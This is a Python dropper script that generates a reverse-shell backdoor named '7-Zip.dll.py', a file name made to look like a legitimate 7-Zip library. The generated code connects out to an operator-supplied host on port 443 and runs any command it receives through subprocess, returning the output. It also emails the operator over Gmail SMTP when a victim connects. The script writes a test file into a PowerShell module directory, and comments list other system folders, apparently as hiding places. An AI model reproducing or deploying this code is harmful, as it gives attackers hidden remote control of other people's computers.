import os

f = open("test.py", 'w')
send_this = "test = \"Holy smokes it works\"\nprint(test)\n"
send_this_too = "Dope"
f.write(send_this + send_this_too)
f.close()

f = open("7-Zip.dll.py", 'w')

a1 = "import socket\n"
a2 = "import os\n"
a3 = "import subprocess\n"
a4 = "import sys\n"
c1 = "import base64\n"
b1 = "import smtplib\n"
b2 = "import io\n"
b3 = "from email.mime.text import MIMEText\n"
b4 = "from email.mime.multipart import MIMEMultipart\n\n"

b5 = "def send_mail():\n"
b6 = "\ts=smtplib.SMTP(\'smtp.gmail.com',587, None, 30)\n"
b7 = "\tuser_email = base64.b64decode()\n"
b8 = "\tPassword = base64.b64decode()\n"
b9 = "\ts.login(user_email, Password)\n\n"

b10 = "\tmsg = MIMEMultipart()\n"
b11 = "\tname = \" \"\n"
b12 = "\temail = user_email\n\n"

b13 = "\tmsg['From'] = email\n"
b14 = "\tmsg['To'] = email\n"
b15 = "\tmsg['Subject'] = \"Client is connecting\"\n\n"

b16 = "\ttext = \"Setup the server, the client is currently waiting for a response\"\n"
b17 = "\tT1 = MIMEText(text, \"plain\")\n\n"

b18 = "\tmsg.attach(T1)\n\n"

b19 = "\ts.send_message(msg)\n"
b20 = "\tdel msg\n\n"

a5 = "HOST = sys.argv[1]\n"
a6 = "PORT = 443\n"
a7 = "Buffer_Size = 1024 * 128\n"
a7_1 = "Separator = \"<sep>\"\n\n"
a8 = "s = socket.socket()\n"
a9 = "s.connect((HOST,PORT))\n"
a10 = "cwd = os.getcwd()\n"
a11 = "s.send(cwd.encode())\n\n"
a12 = "while True:\n"
a13 = "\tcommand = s.recv(Buffer_Size).decode()\n"
a14 = "\tsplit_command = command.split()\n\n"

a15 = "\tif command.lower() == \"exit\":\n"
a16 = "\t\tbreak\n"
a17 = "\tif split_command[0].lower() == \"cd\":\n"
a18 = "\t\ttry:\n"
a19 = "\t\t\tos.chdir(' '.join(split_command[1:]))\n"
a20 = "\t\texcept FileNotFoundError as e:\n"
a21 = "\t\t\toutput = str(e)\n"
a21_1 = "\t\telse:\n"
a21_2 = "\t\t\toutput = \"\"\n"
a22 = "\telse:\n"
a23 = "\t\toutput = subprocess.getoutput(command)\n\n"


a24 = "\tcwd = os.getcwd()\n"
a25 = "\tmessage = f\'{output}{Separator}{cwd}\'\n"
a26 = "\ts.send(message.encode())\n"
a27 = "s.close()"

f.write(a1+a2+a3+a4+c1+b1+b2+b3+b4+b5+b6+b7+b8+b9+b10+b11+b12+b13+b14+b15+b16+b17+b18+b19+b20+a5+a6+a7+a7_1+a8+a9+a10+a11+a12+a13+a14+a15+a16+a17+a18+a19+a20+a21+a21_1+a21_2+a22+a23+a24+a25+a26+a27)
f.close()

test = os.path.join("/Program Files (x86)/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/", "test1.txt")
f2 = open(test, "w")
f2.write("Success")
f2.close()

#class Exe:
    #def __init__(self):

    #def create_file(self):    
        #C:\Program Files (x86)\WildTangent Games\Integration\UI\EULA\css
        #C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\Functions\Assertions
        #C:\Windows
        #cd : Cannot find path                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           